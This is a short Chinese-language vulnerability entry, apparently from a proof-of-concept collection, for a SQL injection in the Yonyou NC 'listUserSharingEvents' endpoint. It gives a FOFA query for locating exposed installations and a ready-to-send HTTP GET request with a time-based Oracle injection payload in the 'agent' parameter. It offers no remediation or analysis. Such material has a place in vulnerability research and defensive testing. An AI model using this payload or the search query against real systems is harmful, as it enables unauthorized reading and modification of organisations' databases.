## 用友NC listUserSharingEvents SQL注入漏洞

## 漏洞描述
用友 NC `listUserSharingEvents` 接口存在 SQL 注入，攻击者可读取或修改数据库内容。

## 网络空间测绘
```
fofa: app="用友-UFIDA-NC"
```

## POC
```
GET /portal/pt/oacoSchedulerEvents/listUserSharingEvents?agent=1')+AND+1=dbms_pipe.receive_message('RDS',5)--&pageId=login&sch_ed=2&sch_sd=1 HTTP/1.1
Host: [请补充实际域名]
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:139.0) Gecko/20100101 Firefox/139.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
```

## 参考
- 社区情报

